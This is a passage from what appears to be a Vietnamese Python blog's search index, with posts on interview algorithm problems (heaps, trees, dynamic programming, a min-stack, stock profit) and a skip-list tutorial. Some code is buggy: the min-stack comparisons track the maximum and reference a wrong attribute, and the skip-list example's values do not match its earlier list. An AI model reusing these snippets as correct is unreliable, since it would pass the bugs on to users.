lư"},{"url":"2015/04/phong-van-tim-1-trieu-so-nho-nhat-trong-1-ty-so.html","text":"Câu hỏi Cho 1 tỷ số thực, tìm 1 triệu số nhỏ nhất trong 1 tỷ số đấy. Phân tích Cách giải đơn giản nhất là sắp xếp từ bé đến lớn 1 tỷ số đầu vào, sau đó chọn ra 1 triệu số đầu tiên. Độ phức tạp của cách giải này phụ thuộc vào độ phức tạp của thuật toán sắp xếp. Cách này có hai nhược điểm lớn: 1. là tốn bộ nhớ để chứa 1 tỷ số đầu vào để sắp xếp, 2. là nếu số lượng đầu vào không có giới hạn thì cách giải này không dùng được. Giả sử ta chỉ có 1 triệu số đầu vào, thì rõ ràng kết quả sẽ chính là 1 triệu số đó. Khi có thêm 1 số mới, số mới này sẽ nằm trong kết quả nếu như nó nhỏ hơn số lớn nhất trong 1 triệu số kết quả hiện tại. Với nhận xét đó, ta có cách giải thứ hai, tối ưu hơn cách đầu tiên. Ta sẽ tạo một max heap với 1 triệu phần tử. Với mỗi phần tử đầu vào, ta sẽ: Đưa vào heap nếu heap chưa có đủ 1 triệu số Nếu heap đã có đủ một triệu số thì lấy từ đỉnh heap ra (tức lấy phần tử lớn nhất trong heap) so sánh với phần tử đầu vào, và đưa lại vào heap phần tử nhỏ hơn trong phép so sánh đó. Độ phức tạp thực thi của cách giải này là O(nlogn) nhưng chỉ tốn bộ nhớ tỷ lệ với số phần tử đầu ra. Cài đặt Ta có thể dùng mô-đun heapq có sẵn để trả lời câu hỏi này. Mô-đun này giúp ta quản lý một min heap . Tuy nhiên, vì ta cần max heap nên các giá trị đầu vào sẽ được đổi thành số bù 0 - x . # encoding: utf-8 import heapq def solve ( inp , n = 1000000 ): heap = [] for i in inp : i = - i if len ( heap ) < n : heapq . heappush ( heap , i ) else : m = heap [ 0 ] if m < i : heapq . heapreplace ( heap , i ) return [ - x for x in heap ] assert ( set ( solve ([ 1 , 2 , 3 , 4 , 5 ], 3 )) == set ([ 1 , 2 , 3 ])) assert ( set ( solve ([ 5 , 4 , 3 , 2 , 1 ], 3 )) == set ([ 1 , 2 , 3 ])) Mô-đun heapq cũng có sẵn hàm nsmallest để giải quyết câu hỏi này ;).","tags":"Bài viết","title":"Phỏng vấn: Tìm 1 triệu số nhỏ nhất trong 1 tỷ số"},{"url":"2015/04/phong-van-so-nhan-vien-cap-duoi.html","text":"Câu hỏi Cho một từ điển từ chuỗi sang chuỗi, khoá là tên nhân viên, và giá trị là tên của người quản lý. Nhân viên cấp cao nhất báo cáo cho chính họ. Tìm số nhân viên cấp dưới của một nhân viên nào đó. Ví dụ: Trong từ điển sau, A và B cùng báo cáo cho C, C và E báo cáo cho F, D báo cáo cho E, và F là nhân viên cấp cao nhất: { \"A\": \"C\", \"B\": \"C\", \"C\": \"F\", \"D\": \"E\", \"E\": \"F\", \"F\": \"F\", } Số lượng nhân viên cấp dưới của A là 0, B là 0, C là 2, D là 0, E là 1, và F là 5. Phân tích Giả sử A là nhân viên cấp dưới của B, và B là nhân viên cấp dưới của C. Cách nhìn trực tiếp từ trên xuống theo câu hỏi này là C có 2 nhân viên cấp dưới, và B có một nhân viên cấp dưới. Nếu nhìn ngược lại, ta sẽ nói rằng A \"đội\" B lên 1, đội tiếp C lên 1, và B đội C lên thêm 1. Tức là mỗi nhân viên sẽ đội tất cả các nhân viên cấp trên của họ lên 1 (A đội B và C, B đội C). Do đó, cách giải câu hỏi này là duyệt hết các phần tử trong danh sách, với mỗi phần tử, lần lượt đội (cộng 1) vào kết quả của các nhân viên cấp trên của phần tử đấy. Độ phức tạp thực thi là O(n&#94;2) và tốn O(n) bộ nhớ. Nếu bạn có cách giải tốt hơn xin hãy cùng chia sẻ tại diễn đàn . Cài đặt def solve ( employees ): subordinate_count = {} for emp , boss in employees . iteritems (): if emp not in subordinate_count : subordinate_count [ emp ] = 0 while emp != boss : try : subordinate_count [ boss ] += 1 except KeyError : subordinate_count [ boss ] = 1 emp , boss = boss , employees [ boss ] return subordinate_count inp = { \"A\" : \"C\" , \"B\" : \"C\" , \"C\" : \"F\" , \"D\" : \"E\" , \"E\" : \"F\" , \"F\" : \"F\" } exp = { \"A\" : 0 , \"B\" : 0 , \"C\" : 2 , \"D\" : 0 , \"E\" : 1 , \"F\" : 5 } assert ( solve ( inp ) == exp )","tags":"Bài viết","title":"Phỏng vấn: Số nhân viên cấp dưới"},{"url":"2015/03/phong-van-cong-chuoi-it-ton-nhat.html","text":"Câu hỏi Cho n chuỗi, tìm cách cộng các chuỗi này lại theo một thứ tự nào đó sao cho ít tốn bộ nhớ nhất. Ví dụ: Cho chuỗi A=abc , B=wxyz , C=g , và xét hai cách cộng chuỗi sau: Cộng A và B trước, sau đó cộng với C . A + B sẽ tốn 3 + 4 = 7 . Sau đó cộng thêm C sẽ tốn 7 + 1 = 8 . Tổng cộng tốn 7 + 8 = 15 . Cộng A và C trước, sau đó cộng với B . A + C tốn 3 + 1 = 4 . Sau đó cộng thêm B sẽ tốn 4 + 4 = 8 . Tổng cộng tốn 4 + 8 = 12 . Cách cộng chuỗi thứ 2 đỡ tốn bộ nhớ hơn cách thứ 1, và cũng là cách tốn ít bộ nhớ nhất. Phân tích Việc cộng n chuỗi với nhau luôn luôn tốn n-1 phép cộng chuỗi, và tạo ra chuỗi cuối cùng với độ lớn không đổi. Do đó, lý do tốn bộ nhớ không phải là vì kết quả cuối cùng, mà là do các mảng nhớ tạm ta phải sử dụng để chứa kết quả của các phép cộng chuỗi này. Xét ba chuỗi bất kỳ với độ lớn x <= y <= z . Ta cần thực hiện 2 phép cộng chuỗi, và độ lớn của chuỗi cuối cùng sẽ là tổng của x + y + z không đổi. Độ lớn của chuỗi tạm sẽ là tổng này trừ đi độ lớn của chuỗi gốc trong phép cộng chuỗi thứ 2. Dễ thấy rằng nếu ta để dành chuỗi có độ lớn z để cộng cuối cùng, thì độ lớn của chuỗi tạm sẽ là nhỏ nhất, x + y . Do đó, ta sẽ để dành chuỗi có chiều dài lớn nhất cho các phép cộng sau cùng, chuỗi có độ dài lớn thứ hai cho phép cộng kế cuối... Vì vậy, cách giải bài toán này chỉ đơn giản là sắp xếp các chuỗi đã cho theo thứ tự tăng dần về độ lớn chuỗi. Phần cài đặt xin được để dành làm một thử thách nhỏ cho bạn đọc. Diễn đàn là nơi phù hợp để trao đổi thêm về những vấn đề tương tự.","tags":"Bài viết","title":"Phỏng vấn: Cộng chuỗi ít tốn nhất"},{"url":"2015/03/phong-van-in-ra-phan-tu-nho-thu-n-trong-cay-nhi-phan.html","text":"Câu hỏi Cho một cây nhị phân tìm kiếm (binary search tree), in ra phần tử nhỏ thứ n trong cây này. Ví dụ: Với cây nhị phân như sau: 7 5 9 3 6 10 Phần tử nhỏ nhất ( n=1 ) là 3, phần tử nhỏ thứ 2 là 5, phần tử nhỏ thứ 3 là 6. Phân tích Vì đây là cây nhị phân tìm kiếm nên ta luôn có điều kiện bất biến là các đỉnh bên trái luôn luôn nhỏ hơn hoặc bằng, và các đỉnh bên phải luôn luôn lớn hơn hoặc bằng giá trị của đỉnh đang xét. Do đó, phần tử nhỏ nhất thứ n cũng là phần tử thứ n trong quá trình duyệt cây theo thứ tự trái, giữa, phải , tức là theo cách tìm kiếm ưu tiên chiều sâu (depth first search). # encoding: utf-8 def solve ( root , n ): def traverse ( node , nr_seen ): '''Trả về (số đỉnh đã qua, và kết quả).''' if node is None : return nr_seen , None # Tìm trong nhánh trái nr_seen , answer = traverse ( node . left , nr_seen ) if answer is not None : # Tìm thấy kết quả bên nhánh trái. return nr_seen , answer nr_seen += 1 if nr_seen == n : # Đỉnh hiện tại chính là đỉnh cần tìm. return nr_seen , node . value # Tìm trong nhánh phải nr_seen , answer = traverse ( node . right , nr_seen ) return nr_seen , answer nr_seen , answer = traverse ( root , 0 ) return answer class Node ( object ): def __init__ ( self , value , left = None , right = None ): self . value = value self . left = left self . right = right root = Node ( 7 , Node ( 5 , Node ( 3 ), Node ( 6 )), Node ( 9 , None , Node ( 10 ))) assert ( solve ( root , 1 ) == 3 ) assert ( solve ( root , 2 ) == 5 ) assert ( solve ( root , 3 ) == 6 ) assert ( solve ( root , 4 ) == 7 ) assert ( solve ( root , 5 ) == 9 ) assert ( solve ( root , 6 ) == 10 )","tags":"Bài viết","title":"Phỏng vấn: In ra phần tử nhỏ thứ n trong cây nhị phân"},{"url":"2015/03/phong-van-tim-cac-tu-cung-bo-ky-tu.html","text":"Câu hỏi Cho một quyển từ điển D , và một từ W trong từ điển, yêu cầu xuất ra tất cả các từ có trong từ điển với cùng bộ ký tự như từ W . Ví dụ từ mary có bộ ký tự là một chữ m , một chữ a , một chữ r và một chữ y , từ army cũng có cùng bộ ký tự như vậy. Phân tích Mối quan hệ giữa từ, và bộ ký tự là 1-n , tức là một từ sẽ có một bộ ký tự, nhưng một bộ ký tự có thể có nhiều từ. Do đó, cách giải bài này là thể hiện mối quan hệ giữa từ và bộ ký tự của nó. Với mỗi từ X trong từ điển, ta sẽ tìm ra bộ ký tự K tương ứng của từ đó, và lưu X vào danh sách các từ có bộ ký tự K . Để trả lời câu hỏi, ta chỉ việc in ra danh sách các từ có bộ ký tự tương ứng với W . Độ phức tạp thực thi của cách giải này là O(1) với O(n) bước xử lý trước (preprocessing), và tốn O(n) bộ nhớ. from collections import defaultdict def get_alphabet ( word ): count = defaultdict ( int ) for c in word : count [ c ] += 1 # vì kiểu dict là khả biến, nên ta phải # chuyển \"count\" thành kiểu string để # có thể dùng làm khóa trong một dict khác r = [] for k in sorted ( count . keys ()): r . append ( ' %c%d ' % ( k , count [ k ])) return '' . join ( r ) assert ( get_alphabet ( 'aaabb' ) == 'a3b2' ) def solve ( D , W ): alpha_to_words = defaultdict ( list ) for word in D : alpha = get_alphabet ( word ) alpha_to_words [ alpha ] . append ( word ) return alpha_to_words [ get_alphabet ( W )] assert ( solve ([ 'mary' , 'army' , 'vithon' ], 'mary' ) == [ 'mary' , 'army' ]) Cách giải trên sẽ áp dụng tốt nếu ta cần trả lời cho một loạt các từ W bởi vì ta chỉ tốn thời gian xử lý trước một lần, và sau đó có thể truy vấn alpha_to_words cho mỗi từ W sau đó. Tuy nhiên, nếu ta chỉ cần trả lời câu hỏi cho duy nhất một từ W thì việc tốn thêm O(n) bộ nhớ cho alpha_to_words là không cần thiết. Trong trường hợp đó, ta chỉ việc xét từng từ trong D , nếu nó có cùng bộ ký tự như W thì ta xuất nó ra ngay.","tags":"Bài viết","title":"Phỏng vấn: Tìm các từ cùng bộ ký tự"},{"url":"2015/03/phong-van-so-luong-so-chinh-phuong-it-nhat-de-co-tong-la-n.html","text":"Câu hỏi Cho một số nguyên dương n , tìm số lượng số chính phương ít nhất có tổng là n . Ví dụ: Với n là 9, thì đáp án là 1 (vì 9 là số chính phương), với n là 10 thì đáp án là 2 (9 + 1), với n là 11, đáp án là 3 (9 + 1 + 1), với n là 12 thì đáp án là 3 (4 + 4 + 4). Phân tích Giả sử như ta đã có đáp án cho tất cả các giá trị từ 1 đến n-1 , đáp án cho n sẽ là min(1 + đáp án của (n-x)) với x là một số chính phương. Nói một cách khác, với mỗi số chính phương x nhỏ hơn hoặc bằng n , số lượng số chính phương cần để có tổng là n sẽ là số lượng số chính phương cần để tạo ra tổng là n-x thêm 1 (chính là x). Do đó, đáp án cho n sẽ chính là min của các cách tạo ra tổng n từ các số chính phương nhỏ hơn hoặc bằng n . Như vậy, ta có thể giải bài toán này bằng cách điền vào bảng trả lời (đặt tên là ans ) cho các giá trị từ 0 đến n . Kết quả cuối cùng sẽ là giá trị của ans[n] . Cách giải các bài toán mà đáp án cho giá trị cuối cùng có thể được tính từ đáp án của các giá trị trước, và ta có thể tính các giá trị này bằng cách từ từ điền vào bảng, được gọi là quy hoạch động (dynamic programming). def solve ( n ): ans = [ n ] * ( n + 1 ) ans [ 0 ] = 0 ans [ 1 ] = 1 for i in xrange ( 2 , n + 1 ): x = 0 while True : x += 1 x2 = x * x if x2 > i : break ans [ i ] = min ( ans [ i ], 1 + ans [ i - x2 ]) return ans [ n ] assert ( solve ( 9 ) == 1 ) assert ( solve ( 10 ) == 2 ) assert ( solve ( 11 ) == 3 ) assert ( solve ( 12 ) == 3 ) Độ phức tạp thực thi của cách giải này là O(n * sqrt(n)) , và tốn O(n) bộ nhớ.","tags":"Bài viết","title":"Phỏng vấn: Số lượng số chính phương ít nhất để có tổng là n"},{"url":"2015/03/phong-van-cai-dat-ngan-xep-voi-thao-tac-minmax.html","text":"Câu hỏi Cài đặt cấu trúc dữ liệu ngăn xếp với thao tác trả về phần tử nhỏ (hay lớn) nhất hiện tại của ngăn xếp. Phân tích Ngăn xếp (stack) là cấu trúc dữ liệu vào sau ra trước (Last In, First Out). Nói đến ngăn xếp ta phải nhớ ngay đến hai tác vụ quan trọng nhất là đẩy vào ( push ) và lấy ra ( pop ). Khi push dữ liệu vào, dữ liệu sẽ nằm trên cùng của ngăn xếp (top of stack). Khi pop , dữ liệu trên cùng của ngăn xếp sẽ được lấy ra khỏi ngăn xếp. Ngoài hai tác vụ trên, ta còn có thể kể thêm một số tác vụ truy vấn cấu trúc dữ liệu này ví dụ như số lượng dữ liệu có trong ngăn xếp, liệu ngăn xếp có dữ liệu hay không, hay xem dữ liệu trên cùng của ngăn xếp (mà không lấy nó ra khỏi ngăn xếp). Câu hỏi này yêu cầu ta cài đặt hai tác vụ push , pop , và thêm tác vụ min (hoặc max ) để cho biết dữ liệu nhỏ nhất (hay lớn nhất) hiện tại trong ngăn xếp mà không lấy nó ra . Cách giải dễ nhất Điều đầu tiên ta nghĩ đến sẽ là tạo một biến để chứa giá trị cực tiểu (hay cực đại). Khi push vào, ta sẽ cập nhật lại biến này nếu cần. Khi hỏi min thì ta chỉ cần trả về giá trị này. Vấn đề phức tạp là khi pop ra, làm sao để ta cập nhật lại biến cực tiểu đó? Một cách rất đơn giản là ta sẽ duyệt lại toàn bộ các dữ liệu đang có trong ngăn xếp để đưa ra giá trị cực tiểu mới. Cách giải này dẫn đến độ phức tạp O(1) cho push , O(1) cho min và O(n) cho pop . class Stack ( object ): def __init__ ( self ): self . store = [] self . min = None def push ( self , value ): self . store . append ( value ) if self . min is None or self . min < value : self . min = value def pop ( self ): r = self . store [ - 1 ] del self . store [ - 1 ] if not self . store : self . min = None else : self . min = min ( self . store ) return r def min ( self ): return self . min Cách giải O(1) cho pop Ta nhận thấy rằng tác vụ pop có độ phức tạp O(n) là bởi vì ta phải duyệt lại toàn bộ các phần tử hiện tại của ngăn xếp để xác định phần tử cực tiểu. Một phương pháp thường được sử dụng để tăng tốc tác vụ là sử dụng bộ nhớ tạm (cache). Ta sẽ tráo đổi giữa thời gian chạy, và không gian nhớ. Nếu như ở mỗi lần push , ta lưu giá trị cực tiểu của các phần tử trong ngăn xếp này vào trong một ngăn xếp thứ hai , thì khi trả lời min , ta chỉ việc nhìn vào ( peek ) ngăn xếp thứ hai là sẽ có ngay kết quả. Và khi pop thì ta chỉ việc pop ở cả hai ngăn xếp. Các tác vụ này đều có độ phức tạp O(1) , nhưng ta sẽ tốn thêm O(n) bộ nhớ cho ngăn xếp thứ hai. class StackBase ( object ): def __init__ ( self ): self . store = [] def push ( self , value ): self . store . append ( value ) def pop ( self ): r = self . store [ - 1 ] del self . store [ - 1 ] return r def peek ( self ): return self . store [ - 1 ] def __bool__ ( self ): return bool ( self . store ) class StackWithMin ( object ): def __init__ ( self ): self . store = StackBase () self . mins = StackBase () def push ( self , value ): self . store . push ( value ) if not self . mins or self . mins . peek () < value : self . mins . push ( value ) else : self . mins . push ( self . min . peek ()) def pop ( self ): self . mins . pop () return self . store . pop () def min ( self ): return self . mins . peek () Cách giải O(1) cho pop cải tiến Cách giải trên tráo đổi O(1) bộ nhớ và O(n) thời gian cho O(n) bộ nhớ và O(1) thời gian. Vấn đề dẫn đến O(n) bộ nhớ là do ở mỗi lần push ta cũng lưu lại giá trị cực tiểu của các phần tử hiện tại. Nếu như ta chỉ lưu vị trí của phần tử cực tiểu, thì ta sẽ tiết kiệm được bộ nhớ một chút. Ta chỉ cần lưu lại vị trí của phần tử cực tiểu mới, nếu vị trí này khác với vị trí hiện tại. Khi pop ra, nếu số lượng phần tử hiện tại ít hơn vị trí của phần tử cực tiểu thì ta cũng pop luôn vị trí này ra khỏi ngăn xếp thứ hai. Điều này đảm bảo điều kiện bất biến vị trí của phần tử cực tiểu luôn luôn nhỏ hơn số lượng phần tử trong ngăn xếp . Cài đặt này xin được để dành làm một thử thách nhỏ cho bạn đọc. Diễn đàn là nơi tốt nhất để bạn đọc trao đổi thêm.","tags":"Bài viết","title":"Phỏng vấn: Cài đặt \"ngăn xếp\" với thao tác \"min/max\""},{"url":"2015/03/phong-van-tim-tich-cua-moi-phan-tu-tru-phan-tu-hien-tai.html","text":"Câu hỏi Cho một danh sách các số thực A , trả về một danh sách trong đó phần tử tại vị trí i có giá trị là tích của các phần tử không phải ở vị trí i trong danh sách A . Phân tích Trường hợp ngoại lệ Nếu A chỉ có một phần tử thì giá trị trả về sẽ là gì? Người đi phỏng vấn phải hỏi ngược lại được người phỏng vấn trường hợp này. Cách giải đơn giản Cách giải đơn giản nhất là ta thực hiện hai vòng lặp để tính giá trị của từng phần tử của danh sách B . def solve ( A ): B = [ 1 ] * len ( A ) for i in xrange ( len ( A )): for j in xrange ( len ( A )): if i != j : B [ i ] *= A [ j ] return B assert ( solve ([ 1 , 7 , 3 , 4 ]) == [ 84 , 12 , 28 , 21 ]) Cách giải này có độ phức tạp là O(n&#94;2) . Cách giải O(n) Có hai nhận xét đơn giản sau: # Nếu như trong số phần tử còn lại có giá trị 0, thì tích số cũng sẽ là 0. # Giá trị của B[i] sẽ là tích của toàn bộ các phần tử trong A , chia cho A[i] . Ta có thể tính tích của toàn bộ các phần tử trong A qua một vòng lặp, và dùng một vòng lặp khác để tính từng giá trị của B . def solve ( A ): nr_zeros = 0 product = 1 for i in xrange ( len ( A )): if A [ i ] == 0 : nr_zeros += 1 else : product *= A [ i ] if nr_zeros >= 2 : return [ 0 ] * len ( A ) B = [ 0 ] * len ( A ) for i in xrange ( len ( B )): if A [ i ] == 0 : B [ i ] = product elif nr_zeros != 1 : B [ i ] = product / A [ i ] return B assert ( solve ([ 1 , 7 , 3 , 4 ]) == [ 84 , 12 , 28 , 21 ]) Cách giải không dùng phép chia Ta nhận thấy rằng B[i] là tích của các phần tử từ 0 đến i-1 và từ i+1 đến n của A (với n là số phần tử trong A). Nói một cách khác, giá trị trong B là tích của hai phần liên tục từ bên trái, và từ bên phải của A . Do đó, ta sẽ sử dụng hai danh sách tạm left_product và right_product để chứa tích các phần tử trong A từ bên trái, và từ bên phải, loại trừ phần tử đang xét. def solve ( A ): left_product = [ 1 ] * len ( A ) right_product = [ 1 ] * len ( A ) for i in xrange ( 1 , len ( A )): left_product [ i ] = left_product [ i - 1 ] * A [ i - 1 ] for i in xrange ( len ( A ) - 2 , - 1 , - 1 ): right_product [ i ] = right_product [ i + 1 ] * A [ i + 1 ] B = [ 1 ] * len ( A ) for i in xrange ( len ( A )): B [ i ] = left_product [ i ] * right_product [ i ] return B assert ( solve ([ 1 , 7 , 3 , 4 ]) == [ 84 , 12 , 28 , 21 ]) Khi đọc kỹ đoạn mã trên, ta sẽ thấy rằng có lẽ danh sách left_product là thừa. Thay vào đó, trong quá trình tính B , ta có thể giữ một biến tạm cho biết tích từ A[0] đến A[i - 1] . Phần này xin được dành làm một thử thách nhỏ cho bạn đọc. Nếu bạn giải ra, xin hãy cùng trao đổi trong diễn đàn .","tags":"Bài viết","title":"Phỏng vấn: Tìm tích của mọi phần tử trừ phần tử hiện tại"},{"url":"2015/03/phong-van-cach-mua-va-ban-loi-nhat.html","text":"Câu hỏi Giả sử như bạn có thông tin về giá của một món hàng trong một khoảng thời gian nào đó. Tìm ngày bạn sẽ mua, và ngày bạn sẽ bán món hàng đó để đạt được lợi nhuận cao nhất. Đầu vào: một danh sách các giá trị thực là giá của món hàng từng ngày. Đầu ra: hai chỉ mục trong danh sách là ngày mua, và ngày bán. Ví dụ: với dữ liệu vào [10, 13, 9, 10, 11] , thì kết quả là (0, 1) ý là mua ngày 0 với mức giá 10, bán ra ngày 1 với mức giá 13, lợi nhuận cao nhất là 3 đơn vị. Phân tích Gọi danh sách đầu vào là A . Câu hỏi này yêu cầu chúng ta tìm hai chỉ mục x và y trong A sao cho A[y] - A[x] lớn nhất, với điều kiện x < y . Đặt min_x là chỉ mục của giá thấp nhất trong danh sách A . Khi xét đến phần tử i trong danh sách A , ta sẽ gặp một số trường hợp sau: Giá giảm A[i] < A[min_x] Đây là cơ hội mua vào nên ta sẽ đặt min_x = i . Giá tăng A[i] >= A[min_x] Đây là cơ hội bán ra nên ta sẽ phải xét thêm A[i] - A[min_x] > A[y] - A[x] , tức là bán vào lúc này có lời hơn lúc trước không. Nếu có, ta sẽ cập nhật y, x = i, min_x . Cài đặt def solve ( A ): x = y = min_x = 0 for i in xrange ( 1 , len ( A )): if A [ i ] < A [ min_x ]: min_x = i elif A [ i ] - A [ min_x ] >= A [ y ] - A [ x ]: x , y = min_x , i return ( x , y ) assert ( solve ([ 10 , 13 , 9 , 10 , 11 ]) == ( 0 , 1 ))","tags":"Bài viết","title":"Phỏng vấn: Cách mua và bán lời nhất"},{"url":"2014/05/danh-sach-nhay-coc-skip-list.html","text":"Giới thiệu Qua các lượt bài trước, chúng ta đã thảo luận về thuận toán tìm kiếm nhị phân và ngăn (partition). Cả hai thuận toán này đều dựa trên cấu trúc dữ liệu mảng (array) vốn rất quen thuộc với chúng ta. Ngoài ra, hai thuật toán trên được xếp vào nhóm thuật toán tất định (determistic algorithm). Các thuật toán thuộc nhóm này thỏa mãn hai điều kiện: Luôn trả về kết quả giống nhau nếu được cung cấp cùng một dữ liệu đầu vào. Các trạng thái (state) trong quá trình tính toán phải giống nhau với cùng một dữ liệu đầu vào. Trong bài viết này tác giả đề cập đến cấu trúc dữ liệu \"Danh Sách Nhảy Cóc\" (Skip List), cơ chế hoạt động của cấu trúc dữ liệu này (bao gồm các thao tác Thêm, Xóa, Tìm Kiếm) phụ thuộc vào yếu tố ngẫu nhiên vì vậy nó được xếp vào nhóm thuật toán ngẫu tính (randomized algorithm), trái ngược với nhóm thuật toán tất định. Mục đích Một cấu trúc dữ liệu đơn giản nhưng hiệu quả trên các tác vụ cơ bản: Thêm, Xóa và Tìm Kiếm. Định nghĩa Danh sách nhảy cóc S là một tập hợp các danh sách S[0], S[1] ... S[N-1] . Để dễ hình dung chúng ta xem mỗi danh sách con tương ứng với một \"tầng\", trong đó 0 là tầng thấp nhất, cho đến N-1 là tầng cao nhất. Danh sách nhảy cóc luôn thỏa mãn các điều kiện: Mỗi danh sách con chứa các giá trị theo thứ tự tăng dần. Phần từ đầu và cuối mỗi danh sách con đều là NULL. Danh sách ở tầng cao hơn là dãy con của danh sách tầng dưới. Ví dụ một trạng thái của danh sách nhảy cóc chứa dãy số 12, 23, 34, 46, 64, 78, 89 : S[3] NULL 23 NULL S[2] NULL 23 64 NULL S[1] NULL 23 34 64 78 NULL S[0] NULL 12 23 34 46 64 78 89 NULL Tìm kiếm trong danh sách Gọi K là giá trị cần tìm kiếm. Ý tưởng chính của thuật toán là cố gắng duyệt càng xa càng tốt trên tầng cao hơn và tiếp tục ở tầng thấp hơn cho đến khi không thể duyệt được nữa. Thuật toán bắt đầu từ phần tử đầu tiên, tầng trên cùng của danh sách. Duyệt theo quy luật: Nhảy sang phần tử kế tiếp trên cùng tầng nếu phần tử tiếp theo đó khác NULL và bé hơn hoặc bằng K. Nếu không thể di chuyển trên cùng tầng được nữa: Dừng duyệt nếu như đang ở tầng thấp nhất. Ngược lại, nhảy xuống phần tử ngay bên dưới ở tầng tiếp theo. Sau khi kết thúc duyệt danh sách, nếu phần tử hiện tại bằng K, thuật toán kết luận tìm được K, ngược lại K không tồn tại trong danh sách. Ví dụ dưới đây minh họa việc tìm kiếm K = 85 trong danh sách S tại trạng thái được mô tả ở phần trước: S[3] NULL -------> 23 NULL S[2] NULL 23 -----------> 64 NULL S[1] NULL 23 34 64 -> 78 -> 83 NULL S[0] NULL 12 23 34 46 64 78 83 90 NULL Giải thích Bước Tầng hiện tại Phần tử hiện tại Phần tử kế tiếp Di chuyển 1 S[3] NULL 23 Nhảy sang phần tử kế tiếp vì 23 <= K 2 S[3] 23 NULL Nhảy xuống tầng dưới vì phần tử kế tiếp bằng NULL 3 S[2] 23 64 Nhảy sang phần tử kế tiếp vì 64 <= K 4 S[2] 64 NULL Nhảy xuống tầng dưới vì phần tử kế tiếp bằng NULL 5 S[1] 64 78 Nhảy sang phần tử kế tiếp vì 78 <= K 6 S[1] 78 83 Nhảy sang phần tử kế tiếp vì 83 <= K 7 S[1] 83 NULL Nhảy xuống tầng dưới vì phần tử kế tiếp bằng NULL 8 S[0] 83 90 Dừng thuật toán vì 90 > K Dựa vào giá trị của phần tử cuối cùng, chúng ta kết luận không tìm thấy giá trị 85 trong danh sách. Mặt khác, nếu chúng ta tìm K = 83 , các bước duyệt trên danh sách sẽ giống hệt như vậy ngoại trừ việc thuật toán sẽ kết thúc ở bước thứ 7 và chúng ta tìm được K. Để ý các bước duyệt, chúng ta thấy thuật toán đã nhảy cóc qua các phần tử 12, 34 và 46. Thêm phần tử vào danh sách Gọi H là giá trị của phần tử cần thêm vào danh sách S. Thuật toán được mô tả như sau: Thực hiện việc tìm kiếm H trong S và lưu lại các vị trí cuối cùng trên mỗi tầng trong khi duyệt: p[N-1], p[N-2], ..., p[1], p[0] tương ứng với tầng N-1, N-2, ..., 1, 0 . Nếu H đã tồn tại trong danh sách S, kết thúc thuật toán. Thêm phần tử giá trị H vào sau p[0] . Tung một đồng xu Nếu được mặt ngửa, di chuyển lên tầng trên và thêm phần tử giá trị H vào sau vị trí tương ứng ở tầng này. ( p[1] nếu là tầng 1, p[2] nếu là tầng 2, ...). Nếu được mặt xấp, dừng thuật toán. Quay lại bước 4. Lưu ý tại bước 4, thuật toán phải tạo tầng mới nếu đồng xu hiện mặt ngửa và chúng ta đang ở tầng trên cùng. Xóa phần tử khỏi danh sách Gọi H là giá trị của phần tử cần phải xóa khỏi danh sách S. Thuật toán khá tương tự với việc thêm phần tử: Thực hiện việc tìm kiếm H trong S và lưu lại các vị trí cuối cùng trên mỗi tầng trong khi duyệt: p[N-1], p[N-2], ..., p[1], p[0] . Nếu không tìm thấy H, thuật toán kết thúc. Ngược lại, xóa tất cả các phần tử tại vị trí p[N-1], p[N-2], ..., p[1], p[0] khỏi danh sách. Xóa tất cả các tầng trống (tầng chỉ có hai phần tử NULL ở đầu và cuối). Cài đặt Chúng ta định nghĩa một phần tử của danh sách nhảy cóc như sau: class SkipListNode ( object ): def __init__ ( self , value ): self . value = value self . next = None self . down = None Như các bạn thấy, với mỗi phần tử ngoài giá trị cần lưu, chúng ta chỉ quan tâm đến phần tử kế tiếp (bên phải) và phần tử tương ứng nằm ở tầng dưới. Kế tiếp, định nghĩa danh sách nhảy cóc với hàm khởi tạo: class SkipList ( object ): def __init__ ( self ): self . head = SkipListNode ( None ) Lớp SkipList sử dụng biến head để lưu phần tử đầu tiên của tầng cao nhất, đây luôn là vị trí bắt đầu khi chúng ta duyệt danh sách. Dễ thấy rằng tác vụ Thêm và Tìm Kiếm đều cần phải duyệt qua danh sách với cùng một cách để tìm một giá trị, vì vậy chúng ta định nghĩa hàm _search để có thể dùng chung cho cả hai như sau: # def _search ( self , value ): last_nodes = [] current_node = self . head while True : if current_node . next is not None and current_node . next . value <= value : current_node = current_node . next else : last_nodes . append ( current_node ) if current_node . down is not None : current_node = current_node . down else : break return last_nodes Cách hoạt động của hàm này được mô tả ở mục Tìm kiếm trong danh sách , giá trị trả về là danh sách p[N-1], p[N-2], ..., p[0] tương ứng với phần tử cuối cùng được duyệt đến tại các tầng N-1, N-1, ..., 0 . Lúc này hàm search của chúng ta khá đơn giản, chỉ cần kiểm tra giá trị của phần tử cuối cùng được trả về bởi _search : # def search ( self , value ): last_nodes = self . _search ( value ) if last_nodes [ - 1 ] . value == value : return value return None Hàm insert để thêm phần tử vào danh sách: # def insert ( self , new_value ): last_nodes = self . _search ( new_value ) # Stop if the value is already there in the list if last_nodes [ - 1 ] . value == new_value : return last_created_node = None while True : new_node = SkipListNode ( new_value ) if len ( last_nodes ) > 0 : last_node = last_nodes . pop () new_node . next = last_node . next last_node . next = new_node else : new_head = SkipListNode ( None ) new_head . down = self . head new_head . next = new_node new_node . next = None self . head = new_head new_node . down = last_created_node last_created_node = new_node # We are flipping the coin now if random . randint ( 0 , 1 ) != 0 : break Và cuối cùng là hàm remove để xóa phần tử khỏi danh sách: # def remove ( self , value ): current_node = self . head while True : if current_node . next is not None and current_node . next . value <= value : if current_node . next . value < value : current_node = current_node . next else : current_node . next = current_node . next . next if current_node . value is None and current_node . next is None \\ and current_node . down is not None : self . head = current_node . down else : if current_node . down is not None : current_node = current_node . down else : break Về cơ bản hàm này khá giống hàm _search : chúng ta vẫn duyệt từ head để tìm kiếm giá trị value . Điểm khác biệt là, nếu tìm thấy value ở bất kỳ tầng nào, chúng ta tiến hành xóa phần tử khỏi tầng đó đồng thời xóa luôn tầng này nếu không còn phần tử (khác NULL ) nào khác. Độ phức tạp Trung bình Bộ nhớ cần thiết: O(n) Thời gian tìm kiếm, thêm, xóa: O(logn) Tệ nhất Bộ nhớ cần thiết: O(n*logn) Thời gian tìm kiếm, thêm, xóa: O(n) Bàn luận thêm Các bạn có thể thấy ở thao tác Thêm phần tử , danh sách không thay đổi nếu chúng ta thêm một phần tử vốn đã có sẵn trong danh sách. Điều này đồng nghĩa với việc chúng ta mặc định các phần tử là đôi một khác nhau. Hãy sửa lại các đoạn mã ở trên để danh sách nhảy 